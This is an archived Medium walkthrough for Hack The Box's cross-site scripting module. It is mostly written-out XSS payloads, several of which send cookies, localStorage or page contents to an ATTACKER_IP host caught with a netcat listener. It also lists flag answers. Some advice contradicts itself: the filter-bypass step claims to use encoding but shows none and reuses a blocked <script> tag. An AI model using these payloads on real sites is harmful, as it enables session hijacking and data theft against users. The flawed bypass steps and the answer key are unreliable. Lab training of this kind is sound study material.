# Step-by-Step Guide to Solving HTB’s XSS Module

- **Source URL:** https://medium.com/@Arsenelupin12/step-by-step-guide-to-solving-htbs-xss-module-section-by-section-flag-solutions-bc07e0cb9928?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20250131015133/https://medium.com/@Arsenelupin12/step-by-step-guide-to-solving-htbs-xss-module-section-by-section-flag-solutions-bc07e0cb9928
- **Fetched:** 2026-11-21
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/8642 (id 8642)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
Step-by-Step Guide to Solving HTB’s XSS Module: Section-by-Section Flag Solutions

By \[wasted resources\]

This guide breaks down the Hack The Box (HTB) Cross-Site Scripting (XSS) module into individual sections, providing targeted solutions for capturing each flag. Let’s tackle them one by one!

—

\*Section 1: Reflected XSS Flag

Objective: Exploit a reflected XSS vulnerability to trigger an alert and uncover the flag.

1\. Identify the Input Field: 

— Navigate to the target web app (e.g., \`[http://10.10.10.100:3000/search\`](http://10.10.10.100:3000/search`)). 

— Look for a search bar or URL parameter that reflects input (e.g., \`?query=test\`).

2\. Test for Reflection: 

— Enter a test payload: 

\`\`\`html

\<script>alert(“XSS”)\</script>

\`\`\` 

— If an alert pops up, the page is vulnerable.

3\. Capture the Flag: 

— The flag is often hidden in the page source or triggered by a specific alert. 

— Submit the payload and check the browser’s developer console (\*\*F12 > Console\*\*) for a message like: 

\`\`\` 

Flag: HTB{r3fl3ct3d\_x55\_d0n3} 

\`\`\`

— -

\*Section 2: Stored XSS Flag

\*Objective: Use stored XSS to hijack an admin session and steal the flag.

1\. Find a Persistent Input: 

— Go to a comment section or feedback form (e.g., \`[http://10.10.10.100:3000/feedback\`](http://10.10.10.100:3000/feedback`)).

2\. Inject a Stored Payload: 

— Submit this payload to steal cookies: 

\`\`\`html

\<script>

fetch(‘[http://ATTACKER\_IP:8000/?cookie='](http://attacker_ip:8000/?cookie=%27) + document.cookie);

\</script>

\`\`\` 

— Replace \`ATTACKER\_IP\` with your server’s IP (or ngrok URL).

3\. Retrieve the Flag: 

— Start a listener to catch the admin’s cookie: 

\`\`\`bash

nc -lvnp 8000

\`\`\` 

— Wait for the admin bot to trigger the payload. You’ll receive a request like: 

\`\`\` 

GET /?cookie=flag=HTB{st0r3d\_x55\_ftw} 

\`\`\`

— -

- Section 3: DOM-Based XSS Flag
- Objective: Exploit client-side DOM manipulation to extract the flag.

1\. Analyze the Page Source: 

— Visit a page with client-side rendering (e.g., \`[http://10.10.10.100:3000/profile\`](http://10.10.10.100:3000/profile`)). 

— Check for JavaScript that unsafely uses \`document.write\` or \`innerHTML\`.

2\. Craft a DOM Payload: 

— Inject a payload into a URL fragment (e.g., \`#\`): 

\`\`\`

[http://10.10.10.100:3000/profile#](http://10.10.10.100:3000/profile#)\<img src=x onerror=”alert(1)”> 

\`\`\` 

— If the alert fires, proceed to steal data.

3\. Extract the Flag: 

— Use a payload to read the DOM: 

\`\`\`html

\<script>

fetch(‘[http://ATTACKER\_IP:8000?flag='](http://attacker_ip:8000/?flag=%27) + document.documentElement.innerHTML);

\</script>

\`\`\` 

— The flag will appear in your listener logs: 

\`\`\` 

HTB{d0m\_x55\_4\_th3\_win} 

\`\`\`

— -

\*Section 4: XSS in Restricted Contexts

Objective: Bypass input filters to execute a payload.

1\. Identify Blacklisted Characters: 

— Test if \`\<>/script\` are blocked. If so, use alternative syntax: 

\`\`\`

\<img src=x onerror=”alert(1)”>

\`\`\`

2\. Bypass Sanitization: 

— If \`onerror\` is blocked, use encoding: 

\`\`\`

\<svg>\<script>alert(1)\</script>\</svg>

\`\`\`

3\. Capture the Flag: 

— Inject a payload to redirect the admin to your server: 

\`\`\`

\<script>window.location=’[http://ATTACKER\_IP:8000?flag='+localStorage.getItem('flag')](http://attacker_ip:8000/?flag=%27+localStorage.getItem%28%27flag%27%29)\</script>

\`\`\` 

— The flag will be sent to your listener: 

\`\`\` 

HTB{r35tr1ct10n5\_bYP4553d} 

\`\`\`

— -

\*Section 5: CSP Bypass 

\*Objective: Circumvent Content Security Policy (CSP) to execute XSS.

1\. Check CSP Headers: 

— Use browser dev tools (\*\*Network > Headers\*\*) to view the CSP policy. 

— Look for unsafe directives like \`unsafe-inline\` or whitelisted domains.

2\. Exploit a Whitelisted Domain: 

— If \`[https://cdn.example.com\`](https://cdn.example.com`) is allowed, host your payload there: 

\`\`\`

\<script src=”[https://cdn.example.com/malicious.js](https://cdn.example.com/malicious.js)">\</script>

\`\`\`

3\. Steal the Flag: 

— Use a payload that leverages the whitelisted domain: 

\`\`\`javascript

// malicious.js

fetch(‘[http://ATTACKER\_IP:8000?flag='](http://attacker_ip:8000/?flag=%27) + document.cookie);

\`\`\` 

— The flag will appear as: 

\`\`\` 

HTB{c5p\_bYP455\_u51n9\_cdN} 

\`\`\`

— -

\*Section 6: Advanced Payload (Stealing Local Storage)\*\* 

\*Objective: Extract sensitive data from the browser’s local storage.

1\. dentify Local Storage Usage: 

— Check if the app stores data in \`localStorage\` (\*\*F12 > Application > Local Storage).

2\. Craft a Payload: 

— Inject code to exfiltrate local storage: 

\`\`\`html

\<script>

fetch(‘[http://ATTACKER\_IP:8000?flag='](http://attacker_ip:8000/?flag=%27) + localStorage.getItem(‘adminFlag’));

\</script>

\`\`\`

3\. Retrieve the Flag: 

— The admin’s local storage data will be sent to your server: 

\`\`\` 

HTB{l0c4l\_570r4g3\_h4x} 

\`\`\`

— -

\*Final Flag: Combining Techniques 

\*Objective: Chain multiple XSS techniques to capture the final flag.

1\. Exploit a Hybrid Vulnerability: 

— Use a stored DOM-based XSS payload: 

\`\`\`html

\<svg onload=”fetch(‘[http://ATTACKER\_IP:8000?flag='+window.location.hash.substr(1))](http://attacker_ip:8000/?flag=%27+window.location.hash.substr%281%29%29)">

\`\`\`

2\. Trigger the Payload: 

— The admin will visit a URL like: 

\`\`\` 

[http://10.10.10.100:3000#HTB{f1n4l\_x55\_ch4ll3ng3](http://10.10.10.100:3000#HTB{f1n4l_x55_ch4ll3ng3)} 

\`\`\`

3\. Capture the Final Flag: 

— Your server logs will reveal: 

\`\`\` 

HTB{f1n4l\_x55\_ch4ll3ng3} 

\`\`\`

— -

\*Conclusion

By methodically addressing each section’s unique challenge, you’ve mastered reflected, stored, DOM-based, and advanced XSS techniques. Apply these skills responsibly in real-world scenarios!

\*Follow me on Medium for more deep dives into HTB challenges and cybersecurity tactics!🔒
